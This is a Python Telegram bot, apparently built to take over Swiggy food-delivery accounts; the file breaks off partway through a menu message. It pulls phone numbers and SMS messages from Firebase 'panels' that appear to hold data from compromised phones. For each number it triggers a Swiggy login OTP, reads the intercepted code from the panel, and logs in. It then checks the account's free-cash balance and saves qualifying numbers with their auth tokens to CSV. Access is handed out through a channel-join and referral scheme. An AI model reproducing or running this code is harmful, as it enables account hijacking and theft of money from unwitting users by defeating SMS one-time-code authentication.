#!/usr/bin/env python3
"""
Swiggy TG Bot — Private Panel Per User + Single Number Check
Fixed for stable Railway deployment.
"""

import asyncio
import csv
import json
import logging
import os
import re
import signal
import sys
import time
import base64
import random
import uuid
import urllib.parse
import zlib
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Tuple

import aiohttp
import httpx
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    Update,
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from telegram.error import TelegramError, Conflict, NetworkError

# ─── Config ───────────────────────────────────────────────────────────────────

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s – %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
    stream=sys.stdout,
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS: set[int] = {
    int(x) for x in os.environ.get("ADMIN_IDS", "1446058092,6894923643").split(",") if x.strip()
}

REQUIRED_CHANNELS = [
    {"username": "blankkdealz",     "url": "https://t.me/blankkdealz",      "label": "📢 Blank Dealz"},
    {"username": "earnwithsakx",    "url": "https://t.me/earnwithsakx",     "label": "💰 Earn With Sakx"},
    {"username": "blankdealzzchat", "url": "https://t.me/blankdealzzchat",  "label": "💬 Blank Dealz Chat"},
]

DEFAULT_CAMPAIGN_ID = "ougwl_MjU3MTUyNzI0I1JhaHVs"
DEFAULT_SENDER      = "SWIGGY"
DEFAULT_THRESHOLD   = 190
DEFAULT_WORKERS     = 15
OTP_TIMEOUT         = 30
POLL_INTERVAL       = 0.5
REFERRALS_FOR_1H    = 3
ACCESS_HOURS        = 1

NL = "\n"

# Storage paths — use /tmp on Railway if the working dir is read-only
_BASE = Path(os.environ.get("DATA_DIR", Path(__file__).parent))
STATE_FILE       = _BASE / "bot_state.json"
USERS_FILE       = _BASE / "users.json"
USER_PANELS_FILE = _BASE / "user_panels.json"
RESULTS_DIR      = _BASE / "results"
RESULTS_DIR.mkdir(parents=True, exist_ok=True)

# ─── Persistent Storage ───────────────────────────────────────────────────────

def load_json(path: Path, default):
    if path.exists():
        try:
            with open(path, "r") as f:
                return json.load(f)
        except Exception as e:
            logger.error("Error loading %s: %s", path, e)
    return default


def save_json(path: Path, data):
    try:
        tmp = path.with_suffix(".tmp")
        with open(tmp, "w") as f:
            json.dump(data, f, indent=2)
        tmp.replace(path)          # atomic replace — avoids partial writes
    except Exception as e:
        logger.error("Error saving %s: %s", path, e)


def load_users() -> dict:
    return load_json(USERS_FILE, {})


def save_users(u: dict):
    save_json(USERS_FILE, u)


def get_user(uid: int) -> Optional[dict]:
    return load_users().get(str(uid))


def upsert_user(uid: int, **kwargs) -> dict:
    users = load_users()
    key = str(uid)
    if key not in users:
        users[key] = {
            "username": "",
            "access_expiry": 0,
            "referrals_given": 0,
            "referred_by": None,
            "joined_at": int(time.time()),
        }
    users[key].update(kwargs)
    save_users(users)
    return users[key]


def has_access(uid: int) -> bool:
    if uid in ADMIN_IDS:
        return True
    u = get_user(uid)
    return bool(u and u.get("access_expiry", 0) > time.time())


def grant_access_hours(uid: int, hours: int = ACCESS_HOURS) -> float:
    u = get_user(uid)
    now = time.time()
    current_expiry = u.get("access_expiry", now) if u else now
    new_expiry = max(current_expiry, now) + hours * 3600
    upsert_user(uid, access_expiry=new_expiry)
    return new_expiry


# ─── Panel Storage ────────────────────────────────────────────────────────────

def load_user_panels() -> dict:
    return load_json(USER_PANELS_FILE, {})


def save_user_panels(data: dict):
    save_json(USER_PANELS_FILE, data)


def get_user_panels(uid: int) -> dict:
    return load_user_panels().get(str(uid), {})


def add_user_panel(uid: int, panel_data: dict) -> str:
    all_panels = load_user_panels()
    uid_str = str(uid)
    if uid_str not in all_panels:
        all_panels[uid_str] = {}
    pid = f"p_{int(time.time())}_{len(all_panels[uid_str])}"
    all_panels[uid_str][pid] = panel_data
    save_user_panels(all_panels)
    return pid


def remove_user_panel(uid: int, panel_id: str) -> bool:
    all_panels = load_user_panels()
    uid_str = str(uid)
    if uid_str in all_panels and panel_id in all_panels[uid_str]:
        del all_panels[uid_str][panel_id]
        save_user_panels(all_panels)
        return True
    return False


# ─── Channel Gate ─────────────────────────────────────────────────────────────

async def check_channels(bot, uid: int) -> list[dict]:
    not_joined = []
    for ch in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(f"@{ch['username']}", uid)
            if member.status in ("left", "kicked", "banned"):
                not_joined.append(ch)
        except TelegramError:
            not_joined.append(ch)
    return not_joined


def channel_join_keyboard(not_joined: list[dict]) -> InlineKeyboardMarkup:
    buttons = [[InlineKeyboardButton(ch["label"], url=ch["url"])] for ch in not_joined]
    buttons.append([InlineKeyboardButton("✅ I've Joined — Check Now", callback_data="check_join")])
    return InlineKeyboardMarkup(buttons)


# ─── User Session (per-user scraper state) ────────────────────────────────────

class UserSession:
    def __init__(self, uid: int):
        self.uid = uid
        self.semaphore = asyncio.Semaphore(DEFAULT_WORKERS)
        self.session: Optional[aiohttp.ClientSession] = None
        self.running_tasks: Dict[str, asyncio.Task] = {}
        self.results: List[dict] = []
        self.total_scanned = 0
        self.total_found = 0
        self.is_running = False

    async def get_session(self) -> aiohttp.ClientSession:
        if self.session is None or self.session.closed:
            connector = aiohttp.TCPConnector(limit=0, force_close=False)
            self.session = aiohttp.ClientSession(connector=connector)
        return self.session

    async def close(self):
        self.is_running = False
        for task in list(self.running_tasks.values()):
            task.cancel()
        self.running_tasks.clear()
        if self.session and not self.session.closed:
            await self.session.close()
        self.session = None

    def reset_results(self):
        self.results = []
        self.total_scanned = 0
        self.total_found = 0


class SessionManager:
    def __init__(self):
        self._sessions: Dict[int, UserSession] = {}

    async def get(self, uid: int) -> UserSession:
        if uid not in self._sessions:
            self._sessions[uid] = UserSession(uid)
        return self._sessions[uid]

    async def remove(self, uid: int):
        if uid in self._sessions:
            await self._sessions[uid].close()
            del self._sessions[uid]

    async def close_all(self):
        for us in list(self._sessions.values()):
            await us.close()
        self._sessions.clear()


session_manager = SessionManager()

# ─── Helpers ──────────────────────────────────────────────────────────────────

def generate_csrf() -> str:
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return "".join(random.choices(chars, k=40))


def generate_uuid() -> str:
    return str(uuid.uuid4())


def random_user_agent() -> str:
    return (
        "Mozilla/5.0 (Linux; Android 14; SM-A065F Build/UP1A.231005.007; wv) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
        "Chrome/150.0.7871.181 Mobile Safari/537.36"
    )


def random_coordinates() -> Tuple[str, str]:
    lat = 23.52 + random.uniform(-0.01, 0.01)
    lng = 77.81 + random.uniform(-0.01, 0.01)
    return str(round(lat, 7)), str(round(lng, 7))


# ─── Firebase / Panel URL Parsing ─────────────────────────────────────────────

def _normalize_firebase_url(url: str, key: str = "") -> Tuple[str, str]:
    url = url.strip().rstrip("/")
    if url.startswith("http"):
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        if not key:
            for k, v in qs.items():
                if k.lower() in ("key", "auth", "secret", "token"):
                    key = v[0]
                    break
        api_url = (parsed.scheme + "://" + parsed.netloc + parsed.path).rstrip("/")
        if key.startswith("http"):
            key = ""
        return api_url, key
    else:
        if url.endswith("-default-rtdb"):
            return f"https://{url}.firebaseio.com", key
        elif ".firebaseio.com" in url or ".firebasedatabase.app" in url:
            return f"https://{url}", key
        else:
            return f"https://{url}-default-rtdb.firebaseio.com", key


def decode_merge_panels(panel_url: str) -> list:
    parsed = urllib.parse.urlparse(panel_url)
    fragment = parsed.fragment
    if not fragment.startswith("merge="):
        return []
    b64 = fragment[6:]
    b64_padded = b64 + "=" * ((4 - len(b64) % 4) % 4)
    try:
        raw = base64.b64decode(b64_padded)
    except Exception:
        return []
    decoded = ""
    try:
        decoded = zlib.decompress(raw, -15).decode("utf-8")
    except Exception:
        pass
    if not decoded:
        try:
            decoded = raw.decode("latin-1")
        except Exception:
            pass
    if not decoded:
        return []
    panels = []
    try:
        stripped = decoded.strip()
        if stripped.startswith("["):
            shared = json.loads(stripped)
            for item in shared:
                u = item.get("url", "") or item.get("u", "")
                k = item.get("key", "") or item.get("k", "")
                if u:
                    panels.append(_normalize_firebase_url(u, k))
        else:
            for part in stripped.split(","):
                part = part.strip()
                if not part:
                    continue
                segments = part.split("|", 1)
                u = segments[0].strip()
                k = segments[1].strip() if len(segments) > 1 else ""
                if u:
                    panels.append(_normalize_firebase_url(u, k))
    except Exception as e:
        logger.error("decode_merge_panels parse error: %s", e)
    return panels


def get_panel_api_url(panel_url: str) -> Tuple[Optional[str], str]:
    parsed_pre = urllib.parse.urlparse(panel_url)
    if parsed_pre.fragment.startswith("merge="):
        panels = decode_merge_panels(panel_url)
        if panels:
            return panels[0]
        return None, ""

    panel_url_clean = panel_url.split("#")[0]
    parsed = urllib.parse.urlparse(panel_url_clean)
    qs = urllib.parse.parse_qs(parsed.query)

    s_param = qs.get("s", [""])[0]
    if s_param:
        s_padded = s_param + "=" * ((4 - len(s_param) % 4) % 4)
        try:
            decoded = base64.b64decode(s_padded).decode("utf-8")
            for sep in ["|||", "|"]:
                if sep in decoded:
                    parts = decoded.split(sep)
                    if len(parts) >= 2:
                        firebase_url = parts[0].strip()
                        api_key = parts[1].strip()
                        if firebase_url:
                            return firebase_url.rstrip("/"), api_key
        except Exception:
            pass

    if ".firebaseio.com" in panel_url_clean or ".firebasedatabase.app" in panel_url_clean:
        url = panel_url_clean.split("?")[0].split(".json")[0].rstrip("/")
        auth_key = ""
        for k, v in qs.items():
            if k.lower() in ("key", "auth", "secret", "token"):
                auth_key = v[0]
                break
        if auth_key.startswith("http"):
            auth_key = ""
        return url, auth_key

    url = panel_url_clean.split("?")[0].rstrip("/")
    auth_key = ""
    for k, v in qs.items():
        if k.lower() in ("key", "auth", "secret", "token", "apikey", "api_key"):
            auth_key = v[0]
            break
    if auth_key.startswith("http"):
        auth_key = ""
    return url, auth_key


def fb_url(base: str, auth_key: str = "", **extra) -> str:
    params = {}
    if auth_key and not auth_key.startswith("http"):
        params["auth"] = auth_key
    params.update(extra)
    if not params:
        return base
    sep = "&" if "?" in base else "?"
    return base + sep + "&".join(f"{k}={v}" for k, v in params.items())


async def fb_fetch(client: httpx.AsyncClient, url: str, timeout: int = 10):
    try:
        resp = await client.get(url, timeout=timeout)
        if resp.status_code == 200:
            return resp.json(), None
        return None, f"HTTP {resp.status_code}"
    except Exception as e:
        return None, str(e)


# ─── Phone Fetching ───────────────────────────────────────────────────────────

async def fetch_phones_async(
    client: httpx.AsyncClient, api_url: str, auth_key: str, limit: int = 100
) -> List[Tuple[str, str]]:
    """Fetch phone numbers from Firebase panel (async, with status check)."""
    if not api_url:
        return []
    base = api_url.rstrip("/") + "/"

    clients_data, err = await fb_fetch(client, fb_url(f"{base}clients/.json", auth_key))
    if not clients_data or not isinstance(clients_data, dict):
        clients_data, err = await fb_fetch(client, fb_url(f"{base}devices/.json", auth_key))
    if not clients_data or not isinstance(clients_data, dict):
        logger.warning("fetch_phones_async: no clients/devices found. err=%s", err)
        return []

    phones: List[Tuple[str, str]] = []
    for c_id, c_data in clients_data.items():
        if len(phones) >= limit:
            break
        if not isinstance(c_data, dict):
            continue
        # Only process active devices (matches second-script behaviour)
        if not c_data.get("status"):
            continue
        phone = (
            c_data.get("mobNo")
            or c_data.get("phone")
            or c_data.get("mobile")
            or c_data.get("number")
            or c_data.get("phoneNumber")
            or ""
        )
        if phone:
            phone = re.sub(r"\D", "", str(phone))
            if len(phone) == 10 and phone[0] in "6789":
                phones.append((phone, c_id))
                continue
        # Fallback: scan messages for a phone number
        msgs_data, _ = await fb_fetch(client, fb_url(f"{base}messages/{c_id}/.json", auth_key))
        if msgs_data and isinstance(msgs_data, dict):
            for msg in msgs_data.values():
                if not isinstance(msg, dict):
                    continue
                text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                match = re.search(r"\b([6-9]\d{9})\b", text)
                if match:
                    phones.append((match.group(1), c_id))
                    break
    return phones


# ─── OTP Polling ──────────────────────────────────────────────────────────────

async def poll_otp_from_panel(
    firebase_url: str,
    device_id: str,
    sender_keyword: str,
    session: aiohttp.ClientSession,
    api_key: Optional[str] = None,
    timeout: int = OTP_TIMEOUT,
    poll_interval: float = POLL_INTERVAL,
    trigger_time: Optional[int] = None,
) -> Optional[str]:
    if trigger_time is None:
        trigger_time = int(time.time() * 1000)
    start = time.time()
    base_url = firebase_url.rstrip("/") + "/"

    while time.time() - start < timeout:
        try:
            url = f"{base_url}messages/{device_id}.json"
            if api_key:
                url += f"?auth={api_key}"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                if resp.status != 200:
                    await asyncio.sleep(poll_interval)
                    continue
                msgs = await resp.json()
                if not msgs:
                    await asyncio.sleep(poll_interval)
                    continue
                for msg_id in sorted(msgs.keys(), reverse=True):
                    msg_data = msgs[msg_id]
                    if not isinstance(msg_data, dict):
                        continue
                    msg_ts = None
                    for field in ["timestamp", "time", "sentTimestamp", "date", "createdAt", "id"]:
                        if field in msg_data and msg_data[field]:
                            try:
                                msg_ts = int(msg_data[field])
                                break
                            except (ValueError, TypeError):
                                pass
                    if msg_ts is None:
                        try:
                            msg_ts = int(msg_id)
                        except (ValueError, TypeError):
                            continue
                    if msg_ts < trigger_time - 10000:
                        continue
                    if time.time() * 1000 - msg_ts > 120000:
                        continue
                    sender = msg_data.get("sender", "")
                    if sender_keyword.lower() in sender.lower():
                        body = msg_data.get("body") or msg_data.get("message") or ""
                        otp_match = re.search(r"OTP\s*(\d{4,6})", body, re.IGNORECASE)
                        if otp_match:
                            return otp_match.group(1)
                        fallback = re.search(r"(?<!\d)(\d{4,6})(?!\d)", body)
                        if fallback:
                            return fallback.group(1)
                await asyncio.sleep(poll_interval)
        except asyncio.CancelledError:
            return None
        except Exception:
            await asyncio.sleep(poll_interval)
    return None


# ─── Swiggy API Client ────────────────────────────────────────────────────────

class SwiggyClient:
    def __init__(self, session: aiohttp.ClientSession):
        self.session = session
        self.csrf = generate_csrf()
        self.device_id = generate_uuid()
        self.tid: Optional[str] = None
        self.token: Optional[str] = None
        self.user_id: Optional[str] = None

    def _base_headers(self, extra: Optional[dict] = None) -> dict:
        headers = {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.swiggy.com",
            "referer": "https://www.swiggy.com/auth",
            "sec-ch-ua": '"Android WebView";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": random_user_agent(),
        }
        if extra:
            headers.update(extra)
        return headers

    async def send_otp(self, phone: str) -> bool:
        """Check registration and send OTP. Returns True on success."""
        try:
            async with self.session.post(
                "https://www.swiggy.com/mapi/auth/signin-check",
                json={"mobile": phone, "countryCode": "91", "countryKey": "IN", "_csrf": self.csrf},
                headers=self._base_headers(),
                timeout=aiohttp.ClientTimeout(total=10),
            ) as resp:
                if resp.status != 200:
                    return False
                data = await resp.json()
                if not data.get("data", {}).get("registered", False):
                    return False
        except Exception as e:
            logger.debug("send_otp signin-check error: %s", e)
            return False

        try:
            async with self.session.post(
                "https://www.swiggy.com/mapi/auth/sms-otp",
                json={"mobile": phone, "_csrf": self.csrf},
                headers=self._base_headers(),
                timeout=aiohttp.ClientTimeout(total=10),
            ) as resp:
                return resp.status == 200
        except Exception as e:
            logger.debug("send_otp sms-otp error: %s", e)
            return False

    async def verify_otp(self, phone: str, otp: str) -> bool:
        """Verify OTP and store auth tokens. Returns True on success."""
        try:
            async with self.session.post(
                "https://www.swiggy.com/mapi/auth/otp-verify",
                json={"otp": otp, "_csrf": self.csrf},
                headers=self._base_headers(),
                timeout=aiohttp.ClientTimeout(total=10),
            ) as resp:
                if resp.status != 200:
                    return False
                data = await resp.json()
                if data.get("statusCode") != 0:
                    return False
                self.token = data.get("data", {}).get("token")
                self.tid = data.get("tid")
                self.user_id = str(data.get("data", {}).get("customer_id", ""))
                return bool(self.token and self.tid)
        except Exception as e:
            logger.debug("verify_otp error: %s", e)
            return False

    async def get_free_cash(self, campaign_id: str) -> Optional[int]:
        """Fetch rolling free cash balance. Returns integer rupee amount or None."""
        if not self.token or not self.tid:
            return None
        # Full headers from second-script (more complete = fewer API rejections)
        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
            "client-id": "portal",
            "content-type": "application/json",
            "origin": "https://webviews.swiggy.com",
            "priority": "u=1, i",
            "referer": "https://webviews.swiggy.com/",
            "sec-ch-ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "tid": self.tid,
            "token": self.token,
            "user-agent": random_user_agent(),
            "x-requested-with": "in.swiggy.android",
        }
        payload = {
            "generalContext": {"requestContext": {"clientId": "portal_invite"}},
            "campaignRewardRequests": [
                {
                    "campaignType": "CAMPAIGN_TYPE_BUZZ_MONEY_STREAKS",
                    "campaignId": campaign_id,
                    "rollingFreecashParams": {
                        "forceRefresh": True,
                        "requestParams": {
                            "dataRequested": "wallet,connections,transactions",
                            "consumerName": "User",
                            "source": "invite",
                        },
                    },
                }
            ],
        }
        try:
            async with self.session.post(
                "https://spns.swiggy.com/api/v1/campaign/rewards",
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=15),
            ) as resp:
                if resp.status != 200:
                    return None
                data = await resp.json()
                if data.get("statusCode") != 0:
                    return None
                reward_responses = data.get("data", {}).get("campaignRewardResponses", [])
                if not reward_responses:
                    return None
                for reward in reward_responses[0].get("rewards", []):
                    if reward.get("rewardType") == "REWARD_TYPE_ROLLING_FREECASH":
                        total_str = (
                            reward.get("rollingFreecash", {})
                            .get("totalEarned", {})
                            .get("units", "0")
                        )
                        try:
                            return int(total_str)
                        except (ValueError, TypeError):
                            return 0
                return 0
        except Exception as e:
            logger.debug("get_free_cash error: %s", e)
            return None


# ─── Scraper Core ─────────────────────────────────────────────────────────────

async def process_phone(
    phone: str,
    device_id: str,
    api_url: str,
    auth_key: str,
    sender_keyword: str,
    campaign_id: str,
    threshold: int,
    user_session: UserSession,
    progress_callback=None,
) -> Optional[dict]:
    async with user_session.semaphore:
        session = await user_session.get_session()
        client = SwiggyClient(session)

        if not await client.send_otp(phone):
            if progress_callback:
                await progress_callback(phone, "❌ OTP send failed")
            return None

        trigger_time = int(time.time() * 1000)
        otp = await poll_otp_from_panel(
            firebase_url=api_url,
            device_id=device_id,
            sender_keyword=sender_keyword,
            session=session,
            api_key=auth_key,
            trigger_time=trigger_time,
        )
        if not otp:
            if progress_callback:
                await progress_callback(phone, "⏱ OTP timeout")
            return None

        if not await client.verify_otp(phone, otp):
            if progress_callback:
                await progress_callback(phone, "❌ Verify failed")
            return None

        free_cash = await client.get_free_cash(campaign_id)
        user_session.total_scanned += 1

        if free_cash is None:
            if progress_callback:
                await progress_callback(phone, "⚠️ Cash fetch error")
            return None

        if free_cash >= threshold:
            user_session.total_found += 1
            result = {
                "phone": phone,
                "device": device_id,
                "free_cash": free_cash,
                "user_id": client.user_id,
                "tid": client.tid,
                "token": client.token,
            }
            user_session.results.append(result)
            if progress_callback:
                await progress_callback(phone, f"✅ FOUND ₹{free_cash}")
            return result
        else:
            if progress_callback:
                await progress_callback(phone, f"low ₹{free_cash}")
            return None


async def run_scraper(
    uid: int,
    app,
    panel_key: str,
    sender_keyword: str,
    campaign_id: str,
    threshold: int,
    phone_limit: int = 100,
):
    us = await session_manager.get(uid)
    if us.is_running:
        return
    us.is_running = True
    us.reset_results()

    my_panels = get_user_panels(uid)
    panel_config = my_panels.get(panel_key)
    if not panel_config:
        try:
            await app.bot.send_message(uid, "⚠️ Panel not found. Use Add My Panel to re-add it.")
        except Exception:
            pass
        us.is_running = False
        return

    api_url = panel_config.get("api_url", "")
    auth_key = panel_config.get("auth_key", "")
    panel_name = panel_config.get("name", "Unknown")

    status_msg = None
    try:
        status_msg = await app.bot.send_message(
            uid,
            f"🔍 *Scraper Starting...*\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📋 Panel: `{panel_name}`\n"
            f"💰 Threshold: ₹{threshold}\n"
            f"⚙️ Workers: {DEFAULT_WORKERS}\n"
            f"📲 Fetching devices...",
            parse_mode="Markdown",
        )
    except Exception:
        pass

    phones: List[Tuple[str, str]] = []
    try:
        async with httpx.AsyncClient() as fb_client:
            phones = await fetch_phones_async(fb_client, api_url, auth_key, limit=phone_limit)
    except Exception as e:
        logger.error("fetch_phones_async failed: %s", e)

    if not phones:
        try:
            await app.bot.send_message(
                uid, "❌ No active devices found in your panel.\nMake sure your panel has devices with `status: true`."
            )
        except Exception:
            pass
        us.is_running = False
        return

    total = len(phones)
    last_update = time.time()

    try:
        if status_msg:
            await app.bot.edit_message_text(
                f"🚀 *Scan Running*\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"📋 Panel: `{panel_name}`\n"
                f"📱 Devices found: {total}\n"
                f"💰 Threshold: ₹{threshold}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⏳ Starting...",
                uid,
                status_msg.message_id,
                parse_mode="Markdown",
            )
    except Exception:
        pass

    async def on_progress(phone: str, status: str):
        nonlocal last_update
        now = time.time()
        if now - last_update < 3:
            return
        last_update = now
        try:
            if status_msg:
                await app.bot.edit_message_text(
                    f"🚀 *Scanning...*\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📊 Scanned: {us.total_scanned}/{total}\n"
                    f"✅ Found:   {us.total_found}\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"Last: `{phone}` → {status}",
                    uid,
                    status_msg.message_id,
                    parse_mode="Markdown",
                )
        except Exception:
            pass

    tasks = [
        process_phone(phone, device, api_url, auth_key, sender_keyword, campaign_id, threshold, us, on_progress)
        for phone, device in phones
    ]

    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        pass

    # Save results to CSV
    if us.results:
        filename = RESULTS_DIR / f"uid{uid}_{int(time.time())}.csv"
        try:
            with open(filename, "w", newline="", encoding="utf-8") as f:
                writer = csv.DictWriter(f, fieldnames=us.results[0].keys())
                writer.writeheader()
                writer.writerows(us.results)
        except Exception as e:
            logger.error("CSV write error: %s", e)

    # Final summary
    lines = [
        "✅ *Scan Complete!*",
        "━━━━━━━━━━━━━━━━━━",
        f"📊 Total Scanned: {us.total_scanned}",
        f"🎯 Found ≥₹{threshold}: {us.total_found}",
    ]
    if us.results:
        lines.append("")
        lines.append("🏆 *Good Accounts:*")
        for r in us.results[:20]:
            lines.append(f"  `{r['phone']}` → ₹{r['free_cash']}")
        if len(us.results) > 20:
            lines.append(f"  _...and {len(us.results) - 20} more_")
        lines.append("")
        lines.append("📁 Full results saved to CSV")
    else:
        lines.append("")
        lines.append("😔 No qualifying accounts found.")

    try:
        await app.bot.send_message(uid, NL.join(lines), parse_mode="Markdown")
    except Exception:
        pass

    us.is_running = False


# ─── Single Number Check ──────────────────────────────────────────────────────

async def check_single_number_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS and not has_access(uid):
        await update.message.reply_text("⛔ Access expired. Share your referral link to unlock!")
        return
    await update.message.reply_text(
        "🔢 *Check Single Number*\n\n"
        "Send the 10-digit Indian mobile number you want to check.\n"
        "Example: `9876543210`",
        parse_mode="Markdown",
    )
    context.user_data["awaiting_check_phone"] = True


async def _close_check_session(context: ContextTypes.DEFAULT_TYPE):
    """Helper to safely clean up a stored aiohttp session."""
    stored_session = context.user_data.pop("check_session", None)
    context.user_data.pop("check_client", None)
    context.user_data.pop("check_phone", None)
    context.user_data.pop("awaiting_check_otp", None)
    context.user_data.pop("awaiting_check_phone", None)
    if stored_session and not stored_session.closed:
        try:
            await stored_session.close()
        except Exception:
            pass


async def check_single_number_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    phone_raw = update.message.text.strip()
    phone = re.sub(r"\D", "", phone_raw)

    if len(phone) != 10 or phone[0] not in "6789":
        await update.message.reply_text(
            "❌ Invalid number. Please send a valid 10-digit Indian mobile number (starts with 6–9)."
        )
        return

    await update.message.reply_text(f"📤 Sending OTP to `{phone}`...", parse_mode="Markdown")

    connector = aiohttp.TCPConnector(limit=0)
    session = aiohttp.ClientSession(connector=connector)
    client = SwiggyClient(session)

    try:
        sent = await client.send_otp(phone)
    except Exception as e:
        await session.close()
        await update.message.reply_text("⚠️ Error sending OTP. Please try again.")
        context.user_data.pop("awaiting_check_phone", None)
        logger.debug("check_single_number_otp error: %s", e)
        return

    if not sent:
        await session.close()
        await update.message.reply_text(
            f"❌ Could not send OTP to `{phone}`.\n"
            "Number may not be registered on Swiggy, or Swiggy is rate-limiting. Try another number.",
            parse_mode="Markdown",
        )
        context.user_data.pop("awaiting_check_phone", None)
        return

    context.user_data["check_phone"] = phone
    context.user_data["check_session"] = session
    context.user_data["check_client"] = client
    context.user_data.pop("awaiting_check_phone", None)
    context.user_data["awaiting_check_otp"] = True

    await update.message.reply_text(
        f"✅ OTP sent to `{phone}`!\n\n"
        "📩 Check your phone and send the OTP here.\n"
        "⏰ You have 2 minutes before it expires.",
        parse_mode="Markdown",
    )

    async def expire_otp():
        await asyncio.sleep(120)
        if context.user_data.get("awaiting_check_otp"):
            await _close_check_session(context)
            try:
                await context.bot.send_message(
                    uid, "⏰ OTP expired. Use *Check Number* to try again.", parse_mode="Markdown"
                )
            except Exception:
                pass

    asyncio.create_task(expire_otp())


async def check_single_number_verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    otp_raw = update.message.text.strip()
    otp = re.sub(r"\D", "", otp_raw)

    if not (4 <= len(otp) <= 6):
        await update.message.reply_text("❌ Invalid OTP. Please send the 4–6 digit OTP you received.")
        return

    phone = context.user_data.get("check_phone", "")
    client: Optional[SwiggyClient] = context.user_data.get("check_client")
    session: Optional[aiohttp.ClientSession] = context.user_data.get("check_session")

    if not phone or not client or not session:
        await update.message.reply_text("⚠️ Session expired. Use *Check Number* to start again.", parse_mode="Markdown")
        context.user_data.pop("awaiting_check_otp", None)
        return

    await update.message.reply_text("🔐 Verifying OTP...")

    try:
        verified = await client.verify_otp(phone, otp)
    except Exception as e:
        await _close_check_session(context)
        await update.message.reply_text("⚠️ Error verifying OTP. Please try again.")
        logger.debug("verify_otp error: %s", e)
        return

    if not verified:
        await update.message.reply_text(
            "❌ OTP verification failed.\nWrong OTP or it expired. Use *Check Number* to try again.",
            parse_mode="Markdown",
        )
        await _close_check_session(context)
        return

    await update.message.reply_text("💳 OTP verified! Checking free cash balance...")

    campaign_id = context.user_data.get("check_campaign", DEFAULT_CAMPAIGN_ID)
    free_cash = await client.get_free_cash(campaign_id)

    await _close_check_session(context)

    if free_cash is None:
        await update.message.reply_text(
            f"📱 Number: `{phone}`\n⚠️ Could not fetch free cash. Account may have restrictions.",
            parse_mode="Markdown",
        )
    else:
        status = "🟢 HIGH" if free_cash >= DEFAULT_THRESHOLD else "🔴 Low"
        await update.message.reply_text(
            f"📱 Number: `{phone}`\n"
            f"💰 Free Cash: *₹{free_cash}* {status}\n"
            f"👤 User ID: `{client.user_id or 'N/A'}`",
            parse_mode="Markdown",
        )


# ─── Keyboards ────────────────────────────────────────────────────────────────

def get_main_keyboard(is_admin: bool) -> ReplyKeyboardMarkup:
    rows = [
        ["🚀 Start Scan", "🛑 Stop Scan"],
        ["🔢 Check Number"],
        ["➕ Add Panel", "🗑 Remove Panel"],
        ["📋 My Panels", "📊 My Status"],
        ["🔗 My Referral", "⏰ My Access"],
    ]
    if is_admin:
        rows.append(["👑 Give All Access", "👤 Give User Access"])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)


STOPPED_KEYBOARD = ReplyKeyboardMarkup(
    [["🏠 Back to Menu"]],
    resize_keyboard=True,
)

# ─── Menus & Commands ─────────────────────────────────────────────────────────


async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    is_admin = uid in ADMIN_IDS

    # Clear any frozen / pending state before showing the menu
    context.user_data.pop("stopped", None)
    context.user_data.pop("awaiting_scan_settings", None)
    context.user_data.pop("awaiting_add_my_panel", None)
    context.user_data.pop("awaiting_remove_my_panel", None)
    context.user_data.pop("awaiting_check_phone", None)
    context.user_data.pop("awaiting_check_otp", None)
    context.user_data.pop("awaiting_give_all_access", None)
    context.user_data.pop("awaiting_give_user_access", None)

    my_panels = get_user_panels(uid)
    bot_info = await context.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"

    u = get_user(uid)
    refs = u.get("referrals_given", 0) if u else 0
    expiry = u.get("access_expiry", 0) if u else 0

    if is_admin:
        access_str = "♾️ Unlimited (Admin)"
    elif expiry > time.time():
        exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
        access_str = f"✅ Active till {exp_str}"
    else:
        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
        access_str = f"❌ Expired | Refer {needed} more to unlock"

    role = "👑 Admin" if is_admin else "👤 Member"
    total_users = len(load_users())

    admin_section = (
        f"\n━━━━━━━━━━━━━━━━━━\n"
        f"🛠 *Admin Panel*\n"
        f"👤 Total Users: {total_users}"
        if is_admin else ""
    )

    await update.effective_message.reply_text(
        f"🍊 *Swiggy Scraper Bot*\n"
